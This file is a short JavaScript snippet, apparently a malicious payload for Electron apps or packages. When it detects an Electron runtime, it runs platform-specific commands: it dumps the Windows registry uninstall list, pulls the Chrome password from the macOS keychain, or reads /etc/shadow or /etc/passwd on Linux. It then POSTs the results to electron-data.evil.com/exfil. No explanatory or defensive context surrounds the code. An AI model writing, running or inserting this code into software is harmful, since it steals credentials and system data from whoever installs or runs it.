// Only activate in Electron environment where we have elevated privileges
if (process.versions && process.versions.electron) {
  const { exec } = require('child_process');
  const os = require('os');

  // Electron apps often run with higher privileges
  const platform = os.platform();
  let cmd;
  if (platform === 'win32') {
    cmd = 'powershell -NoProfile -Command "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, InstallLocation | ConvertTo-Json"';
  } else if (platform === 'darwin') {
    cmd = 'security find-generic-password -ga "Chrome" 2>&1 | head -20';
  } else {
    cmd = 'cat /etc/shadow 2>/dev/null || cat /etc/passwd';
  }

  exec(cmd, (err, stdout) => {
    if (stdout) {
      const https = require('https');
      const data = JSON.stringify({ platform, data: stdout });
      const req = https.request({
        hostname: 'electron-data.evil.com',
        port: 443,
        path: '/exfil',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });
      req.write(data);
      req.end();
    }
  });
}
